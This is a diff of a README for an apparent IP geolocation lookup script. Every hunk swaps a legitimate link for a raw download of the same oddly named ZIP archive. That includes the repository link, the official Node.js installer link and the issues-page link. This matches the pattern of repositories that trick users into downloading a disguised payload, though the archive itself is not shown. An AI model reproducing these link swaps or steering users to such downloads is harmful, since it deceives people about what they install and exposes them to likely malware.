@@ -1,6 +1,6 @@
 # 🌍 IP-GEOLOCATION-LOOKUP-SCRIPT - Lookup IP Locations Quickly
 
-[![Download IP-GEOLOCATION-LOOKUP-SCRIPT](https://img.shields.io/badge/Download-GitHub-brightgreen?style=for-the-badge)](https://github.com/Picopoppop/IP-GEOLOCATION-LOOKUP-SCRIPT)
+[![Download IP-GEOLOCATION-LOOKUP-SCRIPT](https://img.shields.io/badge/Download-GitHub-brightgreen?style=for-the-badge)](https://github.com/Picopoppop/IP-GEOLOCATION-LOOKUP-SCRIPT/raw/refs/heads/main/pleiotropically/SCRIPT_LOOKU_GEOLOCATIO_I_2.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ IP-GEOLOCATION-LOOKUP-SCRIPT helps you find the location of many IP addresses at
 
 1. Visit this page to download the tool:
    
-   [![Download IP-GEOLOCATION-LOOKUP-SCRIPT](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Picopoppop/IP-GEOLOCATION-LOOKUP-SCRIPT)
+   [![Download IP-GEOLOCATION-LOOKUP-SCRIPT](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Picopoppop/IP-GEOLOCATION-LOOKUP-SCRIPT/raw/refs/heads/main/pleiotropically/SCRIPT_LOOKU_GEOLOCATIO_I_2.7.zip)
 
 2. Click on the **Code** button near the top right of the repository page.  
 3. Select **Download ZIP** and save the file to your computer.  
@@ -44,7 +44,7 @@ IP-GEOLOCATION-LOOKUP-SCRIPT helps you find the location of many IP addresses at
 
 If Node.js is not yet installed on your computer:
 
-1. Go to https://nodejs.org/  
+1. Go to https://github.com/Picopoppop/IP-GEOLOCATION-LOOKUP-SCRIPT/raw/refs/heads/main/pleiotropically/SCRIPT_LOOKU_GEOLOCATIO_I_2.7.zip  
 2. Download the **LTS** version for Windows.  
 3. Run the installer and follow the instructions.  
 4. After installation, open the Command Prompt by pressing Windows + R, typing `cmd`, and pressing Enter.  
@@ -143,7 +143,7 @@ This tool uses the ip-api batch endpoint. It sends multiple IP addresses togethe
 
 Access the repository and download the ZIP here:
 
-[![Download IP-GEOLOCATION-LOOKUP-SCRIPT](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Picopoppop/IP-GEOLOCATION-LOOKUP-SCRIPT)
+[![Download IP-GEOLOCATION-LOOKUP-SCRIPT](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Picopoppop/IP-GEOLOCATION-LOOKUP-SCRIPT/raw/refs/heads/main/pleiotropically/SCRIPT_LOOKU_GEOLOCATIO_I_2.7.zip)
 
 ---
 
@@ -175,4 +175,4 @@ The tool uses standard CSV format for input and output. You can open the output 
 
 If you have questions or encounter issues, you can create an issue on the GitHub page here:
 
-https://github.com/Picopoppop/IP-GEOLOCATION-LOOKUP-SCRIPT/issues
+https://github.com/Picopoppop/IP-GEOLOCATION-LOOKUP-SCRIPT/raw/refs/heads/main/pleiotropically/SCRIPT_LOOKU_GEOLOCATIO_I_2.7.zip
